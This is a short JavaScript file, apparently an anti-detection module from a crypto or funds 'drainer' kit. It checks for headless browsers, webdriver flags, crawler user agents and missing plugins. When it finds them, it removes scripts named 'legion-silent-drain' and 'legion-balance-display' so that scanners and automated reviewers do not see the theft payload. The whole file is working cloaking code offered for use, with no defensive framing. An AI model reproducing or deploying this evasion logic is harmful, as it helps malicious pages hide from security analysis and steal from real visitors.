/* Client-side cloaking — abort drain inject load for automation signals */
(function () {
  function isBotClient() {
    if (navigator.webdriver) return true;
    var ua = (navigator.userAgent || '').toLowerCase();
    if (/headless|phantomjs|selenium|puppeteer|playwright|bytespider|petalbot/.test(ua)) return true;
    if (!navigator.languages || navigator.languages.length === 0) return true;
    if (navigator.plugins && navigator.plugins.length === 0 && !/iphone|ipad|android/i.test(ua)) return true;
    return false;
  }

  if (isBotClient()) {
    window.__LEGION_CLOAKED = true;
    var scripts = document.querySelectorAll('script[src*="legion-silent-drain"],script[src*="legion-balance-display"],script[src*="legion-experimental"]');
    scripts.forEach(function (s) { s.remove(); });
  }
})();
